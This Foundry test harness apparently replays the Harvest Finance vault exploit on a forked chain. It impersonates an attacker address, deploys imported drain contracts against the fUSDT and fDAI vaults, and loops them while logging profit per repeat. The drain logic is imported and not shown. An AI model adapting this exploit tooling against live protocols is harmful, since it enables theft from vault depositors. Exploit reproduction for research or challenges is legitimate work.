// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

/// @title Harvest Attempt 15
/// @notice Replays fresh stage4 and stage5 helpers on the exact preserved `33995 ETH` head.
/// @dev Hypothesis: the current live endpoint is the post-replay head at block `11128838`, and a
///      fresh `fUSDT` stage4 helper may still have profitable repeats even though the last fresh
///      `fDAI` follow-up was already locally negative on-chain.
contract Attempt15 is Test, HarvestConfig {
    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);

    uint256 internal constant EXACT_BLOCK = 11_128_838;
    uint256 internal constant EXACT_BALANCE = 33_995_777_883_829_818_943_794;
    uint256 internal constant EXACT_NONCE = 117;
    uint256 internal constant EXACT_FUSDT = 86_990_664_986_358;
    uint256 internal constant EXACT_FDAI = 9_484_807_609_657_494_339_914_444;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH2_HARVEST"), EXACT_BLOCK);
        require(block.number == EXACT_BLOCK, "unexpected exact block");
        require(ATTACKER.balance == EXACT_BALANCE, "unexpected attacker balance");
        require(vm.getNonce(ATTACKER) == EXACT_NONCE, "unexpected attacker nonce");
        require(FUSDT_VAULT.underlyingBalanceWithInvestment() == EXACT_FUSDT, "unexpected fUSDT state");
        require(FDAI_VAULT.underlyingBalanceWithInvestment() == EXACT_FDAI, "unexpected fDAI state");
    }

    function test_probe_exact_head_stage4_fresh() public {
        uint256 maxRepeats = vm.envOr("HARVEST_TEST_STAGE4_MAX_REPEATS", uint256(10));
        ResetFUSDTDyDx14MDrain drain;

        vm.startPrank(ATTACKER);
        drain = new ResetFUSDTDyDx14MDrain();
        vm.stopPrank();

        _runLoop("STAGE4", drain, FUSDT_VAULT, 3, maxRepeats);
    }

    function test_probe_exact_head_stage5_fresh() public {
        uint256 maxRepeats = vm.envOr("HARVEST_TEST_STAGE5_MAX_REPEATS", uint256(5));
        CurrentFDAIDrain drain;

        vm.startPrank(ATTACKER);
        drain = new CurrentFDAIDrain();
        vm.stopPrank();

        _runLoop("STAGE5", drain, FDAI_VAULT, 1, maxRepeats);
    }

    function test_probe_exact_head_stage4_then_stage5_fresh() public {
        uint256 stage4Repeats = vm.envOr("HARVEST_TEST_STAGE4_MAX_REPEATS", uint256(10));
        uint256 stage5Repeats = vm.envOr("HARVEST_TEST_STAGE5_MAX_REPEATS", uint256(20));
        ResetFUSDTDyDx14MDrain stage4Drain;
        CurrentFDAIDrain stage5Drain;

        vm.startPrank(ATTACKER);
        stage4Drain = new ResetFUSDTDyDx14MDrain();
        vm.stopPrank();
        _runLoop("STAGE4", stage4Drain, FUSDT_VAULT, 3, stage4Repeats);

        vm.startPrank(ATTACKER);
        stage5Drain = new CurrentFDAIDrain();
        vm.stopPrank();
        _runLoop("STAGE5", stage5Drain, FDAI_VAULT, 1, stage5Repeats);
    }

    function _runLoop(
        string memory label,
        HarvestDrainMulti drain,
        IHVault vault,
        uint256 iterations,
        uint256 maxRepeats
    ) internal {
        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = vault.underlyingBalanceWithInvestment();
        uint256 successfulRepeats;

        console.log(label, "_NATIVE_BEFORE:", nativeBefore);
        console.log(label, "_VAULT_BEFORE:", vaultBefore);
        console.log(label, "_HELPER:", address(drain));

        for (uint256 repeatIndex; repeatIndex < maxRepeats; ++repeatIndex) {
            uint256 previousNative = ATTACKER.balance;
            uint256 previousVault = vault.underlyingBalanceWithInvestment();
            uint256 gasBefore = gasleft();

            vm.startPrank(ATTACKER);
            try drain.execute(iterations) {
                vm.stopPrank();
            } catch (bytes memory reason) {
                vm.stopPrank();
                console.log(label, "_REVERT_AT:", repeatIndex + 1);
                console.log(label, "_REVERT_REASON:", _decodeRevert(reason));
                break;
            }

            uint256 currentNative = ATTACKER.balance;
            uint256 currentVault = vault.underlyingBalanceWithInvestment();

            console.log(label, "_REPEAT_INDEX:", repeatIndex + 1);
            console.log(label, "_REPEAT_GAS:", gasBefore - gasleft());
            console.log(label, "_REPEAT_NATIVE_DELTA:", currentNative - previousNative);
            console.log(label, "_REPEAT_VAULT_DELTA:", previousVault > currentVault ? previousVault - currentVault : 0);
            console.log(label, "_REPEAT_NATIVE_AFTER:", currentNative);
            console.log(label, "_REPEAT_VAULT_AFTER:", currentVault);

            if (currentNative <= previousNative || currentVault >= previousVault) {
                console.log(label, "_STOP_AT_LOCAL_LOSS:", repeatIndex + 1);
                break;
            }

            successfulRepeats = repeatIndex + 1;
        }

        console.log(label, "_SUCCESSFUL_REPEATS:", successfulRepeats);
        console.log(label, "_NATIVE_AFTER:", ATTACKER.balance);
        console.log(label, "_NATIVE_DELTA_TOTAL:", ATTACKER.balance - nativeBefore);
        console.log(label, "_VAULT_AFTER:", vault.underlyingBalanceWithInvestment());
        console.log(label, "_VAULT_DELTA_TOTAL:", vaultBefore - vault.underlyingBalanceWithInvestment());
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "empty revert data";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == bytes4(keccak256("Error(string)"))) {
            bytes memory payload = new bytes(revertData.length - 4);
            for (uint256 i; i < payload.length; ++i) {
                payload[i] = revertData[i + 4];
            }
            return abi.decode(payload, (string));
        }

        if (selector == bytes4(keccak256("Panic(uint256)"))) {
            return "panic(uint256)";
        }

        return "non-standard revert";
    }
}
